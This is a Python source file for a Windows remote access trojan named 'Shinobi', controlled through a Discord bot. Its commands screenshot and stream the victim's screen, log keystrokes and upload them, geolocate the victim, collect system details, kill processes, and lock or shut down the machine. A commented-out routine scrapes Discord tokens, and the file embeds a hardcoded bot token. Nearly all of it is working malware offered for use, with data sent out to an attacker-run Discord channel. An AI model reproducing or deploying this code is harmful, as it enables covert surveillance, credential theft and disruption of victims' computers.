# Project: Shinobi

# for file and operating system pkg
import os
import shutil # module para sa file manipulation or modification like copy delete etc
import sys
import re # search pattern. example if need natin i search "sample" kahit i type natin ($S@mple#$) marereturn parin natin yung word na example
import platform  # PKG to get user info
import subprocess

if os.name != "nt":
    exit()

# Discord Pkg
import discord
from discord.ext import commands

import time
from mss import mss  # for screenshoting victim screen from mss import mss kasi may function na pangalan mss rin same sa package ayun yung need natin

# web requesting
import requests
import urllib.request
from urllib.request import urlopen, urlretrieve
from requests import get #Request to web for data Public IP getter

# for Audio and Hardware like keyboard and mouse
import pyHook  # Access keyboard and Mouse of Victim
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume # for audio
import ctypes
from comtypes import CLSCTX_ALL


# for running program in background
import win32process
import win32con
import win32gui
import winreg

# get user current location
import geocoder

# PKG for streaming screen of the victim
import socket
import cv2
import pickle
import struct
import imutils
import mss
import numpy
import time

# code for stream and view
from stream_vic import stream

# Pkg for Keylogger
import pynput
from pynput.keyboard import Key, Listener
import threading

client = commands.Bot(command_prefix='!')
bot_token = 'OTU5NDQ2NDA2ODk5MzMxMTY0.YkcAGQ.1NRL_0qF7NkJvvgA5IXG5nmYR3M'

count = 0
keys = []
timer = 0
# get IP of the victim
victim_ip = get('https://api.ipify.org').text

def MaxVolume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

# Function when out Bot is alive
@client.event
async def on_ready():
    report_channel = client.get_channel(959449626149285988)
    await report_channel.send('Shinobi is Online at this address {}'.format(victim_ip))
    # time.sleep(5)
    myEmbed = discord.Embed(title="I'm Ready", color=0xc40e0e)
    myEmbed.set_thumbnail(url='https://i.pinimg.com/originals/31/a4/94/31a494b737822b7f2ad1b550da18a00e.jpg')
    # await report_channel.send(embed=myEmbed)
    # time.sleep(4)
    # await report_channel.send("Send '!cmds' to know what I'm capable of ")

    # Displaying Brand in Victims Screen
    # time.sleep(1)
    # os.system('start runner.bat')

    # the purpose of this one is to lock user from there mouse and keyboard
    # but somehow it only lags the user to death still a good choice thou
    # hm = pyHook.HookManager()
    # hm.MouseAll = false
    # time.sleep(2)
    # hm.KeyAll = uMad
    # time.sleep(2)
    # await report_channel.send("Messing with their keyboard and mouse now")
    # hm.HookMouse()
    # hm.HookKeyboard()
    # pythoncom.PumpMessages()

    # change this to your choice
    # time.sleep(1)


# Lock Victim from computer
@client.command()
async def lock_user(message):
    await message.send('Locking user now')
    time.sleep(1)
    ctypes.windll.user32.LockWorkStation()


# Shutting Down Victim PC
@client.command()
async def shut_down_user(message, duration: str):
    await message.send('Shutting Down Victim PC this long {}'.format(duration))
    time.sleep(2)
    os.system("shutdown /s /t {}".format(duration))


# Restart Victim PC
@client.command()
async def restart_user(message, duration: str):
    await message.send('Restarting Victim PC this long {}'.format(duration))
    time.sleep(2)
    os.system("shutdown /r /t {}".format(duration))


# Stream Victim Screen
@client.command()
async def show_screen(message):

    await message.send("Opening server now")
    time.sleep(2)
    await message.send('server opened')
    time.sleep(1)
    stream()
    time.sleep(2)

#End Stream
@client.command()
async def end_stream(message):
    await message.send('Ending Stream')
    time.sleep(2)
    end_stream_vic()


# get user info
@client.command()
async def info(message):
    # Reporting User info
    myEmbed = discord.Embed(title=" Victim's Info", color=0xc40e0e)

    myEmbed.add_field(name='Running Machine: ', value=platform.machine(), inline=True)
    myEmbed.add_field(name='Machine Version: ', value=platform.version(), inline=True)
    myEmbed.add_field(name='Machine System: ', value=platform.system(), inline=True)
    myEmbed.add_field(name='Hostname: ', value=platform.node(), inline=True)
    myEmbed.add_field(name="Victim's IP: ", value=victim_ip, inline=True)
    # myEmbed.add_field(name="Victim's IP: ", value=victim_ip, inline=True)

    await message.send(embed=myEmbed)


# grab screenshot of Victim
@client.command()
async def screenshot(message):
    await message.send("I got you my guy")
    time.sleep(2)
    temp = os.path.join(os.getenv('TEMP') + "\\monitor.png")
    with mss() as sct:
        sct.shot(output=temp)
    file = discord.File(temp, filename="monitor.png")
    await message.send("Here's the screenshot", file=file)
    os.remove(temp)

# get victim current location
@client.command()
async def get_location(message):
    await message.send(file=discord.File('8316-wicked-leave.png'))
    time.sleep(2)
    await message.send('getting user current location now')
    time.sleep(1)

    vic_location = geocoder.ip(victim_ip)

    myEmbed = discord.Embed(title=" Victim's Location",description="not exactly location of their home but high chance it's their place", color=0xc40e0e)

    myEmbed.add_field(name='Victim Location: ', value=vic_location, inline=False)
    myEmbed.add_field(name='Latitude and Longitude: ', value=vic_location.latlng, inline=False)

    await message.send(embed=myEmbed)


#Keylogger
@client.command()
async def start_keylogs(message):
    await message.send("Keylogger Started!")
    path = os.getcwd()
    filename = 'keylogs.txt'
    fullpath = os.path.join(path,filename)


    def write_file(keys):
         with open(fullpath,"a") as f:
             for key in keys:
                 k = str(key).replace("'","")
                 if k.find("space") > 0:
                     f.write('\n')
                 elif k.find("Key") == -1:
                     f.write(k)
                 # f.write(str(key))

     # write_file('sample')

    def on_press(key):
         global keys,count

         keys.append(key)
         count += 1

         if count >= 10:
             count = 0
             write_file(keys)
             keys=[]


    def on_release(key):
        global timer
        print(timer)

        if timer >= 50:
            timer = 0
            return False

        else:
            timer += 1

     # def key_log_stop():

    with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()


         # time.sleep(2)
         # break

    await message.send("successfully copied 50 character!")


@client.command()
async def show_keylogs(message):
     path = os.getcwd()
     filename = 'keylogs.txt'
     fullpath = os.path.join(path,filename)
     file_keys = fullpath
     file = discord.File(file_keys, filename=file_keys)
     await message.send("Successfully dumped all the logs", file=file)
     os.remove(file_keys)







# still unfinished
# Steal some token mah boi
# @client.command()
# async def token(message):
#     await message.send("HEHE it's grabbing token time mah boi")
#     time.sleep(2)
#     await message.send("gimme a sec")
#
#     # location of AppData in local computer
#
#     localappdata  = os.getenv('LOCALAPPDATA')
#     roaming = os.getenv('APPDATA')
#
#     # paths to local data
#     paths = {
#         'Discord': os.path.join(roaming, 'Discord'),
#
#     }
#
#     for platform, path in paths.items():
#         path = os.path.join(path, 'Local Storage', 'leveldb')
#
#     if os.path.exists(path) is False:
#         return True
#
#     for item in os.listdir(path):
#
#         if not item[-2:] in ('.log', '.ldb'):
#             continue
#
#         with open(os.path.join(path, item), errors='ignore', encoding='utf-8') as file:
#             lines = file.readlines()
#
#         for line in lines:
#             line = line.strip()
#
#             if len(line) == 0:
#                 continue
#
#             for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', line):
#                 if token in tokens:
#                     continue
#
#                 tokens.append(token)
#
#     await message.send(tokens)
#     time.sleep(2)
#

# Check what app is running
@client.command()
async def check_open_app(message):
    await message.send('reviewing open apps')
    time.sleep(2)
    cmd = 'powershell "gps | where {$_.MainWindowTitle } | select ProcessName,Id'
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    result = []
    for line in proc.stdout:
        if line.rstrip():
            # only print lines that are not empty
            # decode() is necessary to get rid of the binary string (b')
            # rstrip() to remove `\r\n`
            await message.send(line.decode().rstrip())


# Close running apps
@client.command()
async def close_app(message, app: str):
    os.system(" taskkill /f /im {}".format(app))
    time.sleep(2)
    await message.send(f'{app} is now closed LEZGOOOO')


# Open App
# unfinished
# @client.command()
# async def open_app(message, app: str):


# list all installed application
@client.command()
async def list_app(message):
    # var = os.system('C:\Program Files (x86)')

    await message.send("This is the list in C drive")
    time.sleep(2)
    await message.send(os.listdir('C:\Program Files (x86)'))
    await message.send("This is the list in D drive")
    time.sleep(2)
    await message.send(os.listdir('D:\\'))


# Play BG music
@client.command()
async def bg_music(message, youtube_link: str):
    MaxVolume()
    if re.match(r'^(?:http|ftp)s?://', youtube_link) is not None:
            await message.send(f"Playing `{youtube_link}` on **{os.getlogin()}'s** computer")
            os.system(f'start {youtube_link}')
            while True:
                def get_all_hwnd(hwnd, mouse):
                    def winEnumHandler(hwnd, message):
                        if win32gui.IsWindowVisible(hwnd):
                            if "youtube" in (win32gui.GetWindowText(hwnd).lower()):
                                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
                                global pid_process
                                pid_process = win32process.GetWindowThreadProcessId(hwnd)
                                return "ok"
                            else:
                                pass

                    if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                        win32gui.EnumWindows(winEnumHandler,None)
                try:
                    win32gui.EnumWindows(get_all_hwnd, 0)
                except:
                    break
    else:
        await message.send("Invalid Youtube Link")


# Stop BG music
@client.command()
async def stop_bg(message):
    await message.send("stopped the music")
    os.system(f"taskkill /F /IM {pid_process[1]}")

# delete message
@client.command()
async def delete(message,amount = 66):
     await message.channel.purge(limit=amount)



# give bot a rest
@client.command()
async def rest(message):
    await message.send("We're going offline now")
    exit()



@client.command()
async def banner(message):
    await message.send("We're gonna leave our mark")

    # running the banner to victim
    os.system('start runner.bat')
    time.sleep(2)

    # sending screenshot to our Discord server
    temp = os.path.join(os.getenv('TEMP') + "\\monitor.png")
    with mss() as sct:
        sct.shot(output=temp)
    file = discord.File(temp, filename="monitor.png")
    await message.send("Here's the screenshot", file=file)
    os.remove(temp)


client.run(bot_token)
